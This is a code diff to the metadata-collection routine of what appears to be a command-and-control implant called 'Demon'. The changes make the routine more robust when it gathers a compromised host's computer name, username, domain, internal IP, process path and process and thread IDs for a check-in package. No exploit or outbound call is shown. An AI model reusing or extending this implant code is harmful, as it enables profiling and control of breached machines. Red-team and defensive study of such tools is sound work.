@@ -159,13 +159,16 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     PackageAddInt32( *MetaData, Instance.Session.AgentID );
 
     // Get Computer name
+    dwLength = 0;
     if ( ! Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &dwLength ) )
     {
         if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
         {
             MemSet( Data, 0, dwLength );
-            Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &dwLength );
-            PackageAddBytes( *MetaData, Data, dwLength );
+            if ( Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &dwLength ) )
+                PackageAddBytes( *MetaData, Data, dwLength );
+            else
+                PackageAddInt32( *MetaData, 0 );
             DATA_FREE( Data, dwLength );
         }
         else
@@ -175,17 +178,23 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         PackageAddInt32( *MetaData, 0 );
 
     // Get Username
-    dwLength = MAX_PATH;
-    if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
+    dwLength = 0;
+    if ( ! Instance.Win32.GetUserNameA( NULL, &dwLength ) )
     {
-        MemSet( Data, 0, dwLength );
-        Instance.Win32.GetUserNameA( Data, &dwLength );
-        PackageAddBytes( *MetaData, Data, dwLength );
-        DATA_FREE( Data, dwLength );
+        if ( ( Data = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
+        {
+            MemSet( Data, 0, dwLength );
+            if ( Instance.Win32.GetUserNameA( Data, &dwLength ) )
+                PackageAddBytes( *MetaData, Data, dwLength );
+            else
+                PackageAddInt32( *MetaData, 0 );
+            DATA_FREE( Data, dwLength );
+        }
+        else
+            PackageAddInt32( *MetaData, 0 );
     }
     else
         PackageAddInt32( *MetaData, 0 );
-
 
     // Get Domain
     dwLength = 0;
@@ -206,13 +215,16 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     else
         PackageAddInt32( *MetaData, 0 );
 
+    // Get internal IP
     dwLength = 0;
-    Instance.Win32.GetAdaptersInfo( NULL, &dwLength );
-    if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
+    if ( Instance.Win32.GetAdaptersInfo( NULL, &dwLength ) )
     {
-        if ( Instance.Win32.GetAdaptersInfo( Adapter, &dwLength ) == NO_ERROR )
+        if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, dwLength ) ) )
         {
-            PackageAddString( *MetaData, Adapter->IpAddressList.IpAddress.String );
+            if ( Instance.Win32.GetAdaptersInfo( Adapter, &dwLength ) == NO_ERROR )
+                PackageAddString( *MetaData, Adapter->IpAddressList.IpAddress.String );
+            else
+                PackageAddInt32( *MetaData, 0 );
             DATA_FREE( Adapter, dwLength );
         }
         else
@@ -222,16 +234,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         PackageAddInt32( *MetaData, 0 );
 
     // Get Process Path
-    Length = ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Length;
-    if ( ( Data = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
-    {
-        Length = WCharStringToCharString(
-                Data,
-                ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer,
-                Length
-        );
-        PackageAddBytes( *MetaData, Data, Length );
-    } else PackageAddInt32( *MetaData, 0 );
+    PackageAddWString( *MetaData, ( ( PRTL_USER_PROCESS_PARAMETERS ) Instance.Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer );
 
     PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) Instance.Teb->ClientId.UniqueProcess );
     PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) Instance.Teb->ClientId.UniqueThread );
